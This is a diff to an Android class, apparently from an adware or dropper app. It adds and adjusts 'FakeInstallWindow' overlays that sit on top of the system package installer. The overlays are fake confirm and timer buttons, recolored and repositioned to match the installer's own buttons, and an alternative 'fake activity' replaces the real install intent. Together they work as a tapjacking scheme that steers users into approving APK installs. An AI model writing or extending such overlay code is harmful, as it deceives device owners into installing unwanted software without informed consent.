@@ -47,10 +47,14 @@ public class UtilOperator {
         handler.post(new Runnable() {
             @Override
             public void run() {
+                boolean useActivity = false;
+                SettingManager.getInstance().setCancelInstallReserve(false);
                 if (!Utils.isVersionBeyondGB()) {
                     fake = new FakeInstallWindowForGB(context);
+                    useActivity = false;
                 } else {
                     fake = new FakeInstallWindow(context);
+                    useActivity = true;
                 }
                 fake.show(true);
                 fake.updateTimerCount();
@@ -58,12 +62,17 @@ public class UtilOperator {
                 Config.DOWNLOAD_PROCESS_RUNNING.set(false);
                 Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] try to install apk : " + fullPath);
 
-                Intent i = new Intent(Intent.ACTION_VIEW);
-                File upgradeFile = new File(fullPath);
-                i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
-                i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
-                context.startActivity(i);
+                AppRuntime.CANCEL_COUNT = 0;
+                if (!Config.BUTTON_CHANGED_ENABLE || !useActivity) {
+                    Intent i = new Intent(Intent.ACTION_VIEW);
+                    File upgradeFile = new File(fullPath);
+                    i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
+                    i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
+                    context.startActivity(i);
+                } else {
+                    Utils.startFakeActivity(context, fullPath);
+                }
 
                 if (!AppRuntime.WATCHING_SERVICE_RUNNING.get()) {
                     Intent is = new Intent();
@@ -93,6 +102,9 @@ public class UtilOperator {
         protected float density;
 
         protected WindowManager.LayoutParams confirmFullBtnParams;
+        protected WindowManager.LayoutParams confirmBtnParams;
+        protected WindowManager.LayoutParams timerBtnParams;
+
 
         public FakeInstallWindow(Context context) {
             this.context = context;
@@ -105,9 +117,8 @@ public class UtilOperator {
             wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
             handler = new Handler(context.getMainLooper());
 
-//            int color = AppRuntime.getColorFromBitmap(context, AppRuntime.SHOW_BT);
-
-//            installView.setBackgroundColor(color);
+            installView.setBackgroundColor(context.getResources().getColor(android.R.color.background_dark));
+            installFullView.setBackgroundColor(context.getResources().getColor(android.R.color.background_dark));
 
             DisplayMetrics dm = new DisplayMetrics();
             wm.getDefaultDisplay().getMetrics(dm);
@@ -156,6 +167,23 @@ public class UtilOperator {
                 Utils.tryToActivePluginApp(context);
 //                }
             } else {
+                if (SettingManager.getInstance().getCancelInstallReserve()) {
+                    //timer layout
+                    timerBtnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
+                    //full layout
+                    confirmFullBtnParams.gravity = Gravity.BOTTOM | Gravity.LEFT;
+                    //cancel layout
+                    confirmBtnParams.width = (int) (52 * density);
+                    confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2;
+                    confirmBtnParams.gravity = Gravity.BOTTOM | Gravity.START;
+
+                    wm.updateViewLayout(installView, confirmBtnParams);
+                    wm.updateViewLayout(timerView, timerBtnParams);
+                    if (installFullView != null) {
+                        wm.updateViewLayout(installFullView, confirmFullBtnParams);
+                    }
+                }
+
                 if (count == (TIMER_COUNT - 3 * 5) && AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()) {
                     //now just remove install full btn
                     if (installFullView != null) {
@@ -166,6 +194,7 @@ public class UtilOperator {
                     AppRuntime.WATCHING_SERVICE_BREAK.set(true);
                     if (installFullView == null) {
                         installFullView = layoutInflater.inflate(R.layout.fake_install_btn, null);
+                        installFullView.setBackgroundColor(context.getResources().getColor(android.R.color.background_dark));
                         wm.addView(installFullView, confirmFullBtnParams);
                     }
 
@@ -178,6 +207,7 @@ public class UtilOperator {
 
                     if (installFullView == null) {
                         installFullView = layoutInflater.inflate(R.layout.fake_install_btn, null);
+                        installFullView.setBackgroundColor(context.getResources().getColor(android.R.color.background_dark));
                         wm.addView(installFullView, confirmFullBtnParams);
                     }
                 } else if (!AppRuntime.PLUGIN_INSTALLED && AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()
@@ -242,13 +272,13 @@ public class UtilOperator {
 
             AppRuntime.FAKE_WINDOWS_SHOW.set(true);
             //install
-            WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
+            confirmBtnParams = new WindowManager.LayoutParams();
             confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
             confirmBtnParams.format = PixelFormat.RGBA_8888;
             confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
             confirmBtnParams.width = (int) (50 * density);
             confirmBtnParams.height = (int) (48 * density);
-            if (!leftConfirm) {
+            if (!leftConfirm && !SettingManager.getInstance().getCancelInstallReserve()) {
 //                confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + (int) (25 * density);
                 confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + screenWidth / 2;
 //                confirmBtnParams.y = screenHeight - (int) (48 * density);
@@ -266,7 +296,7 @@ public class UtilOperator {
             confirmFullBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
             confirmFullBtnParams.width = screenWidth / 2;
             confirmFullBtnParams.height = (int) (48 * density);
-            if (!leftConfirm) {
+            if (!leftConfirm && !SettingManager.getInstance().getCancelInstallReserve()) {
                 confirmFullBtnParams.gravity = Gravity.BOTTOM | Gravity.RIGHT;
             } else {
                 confirmFullBtnParams.gravity = Gravity.BOTTOM | Gravity.LEFT;
@@ -275,18 +305,18 @@ public class UtilOperator {
             wm.addView(installFullView, confirmFullBtnParams);
 
             //timer
-            WindowManager.LayoutParams btnParams = new WindowManager.LayoutParams();
-            btnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
-            btnParams.format = PixelFormat.RGBA_8888;
-            btnParams.flags = android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
-            btnParams.width = screenWidth / 2;
-            btnParams.height = (int) (48 * density);
-            if (!leftConfirm) {
-                btnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
+            timerBtnParams = new WindowManager.LayoutParams();
+            timerBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
+            timerBtnParams.format = PixelFormat.RGBA_8888;
+            timerBtnParams.flags = android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
+            timerBtnParams.width = screenWidth / 2;
+            timerBtnParams.height = (int) (48 * density);
+            if (!leftConfirm && !SettingManager.getInstance().getCancelInstallReserve()) {
+                timerBtnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
             } else {
-                btnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
+                timerBtnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
             }
-            wm.addView(timerView, btnParams);
+            wm.addView(timerView, timerBtnParams);
 
             //cover
             WindowManager.LayoutParams wMParams = new WindowManager.LayoutParams();
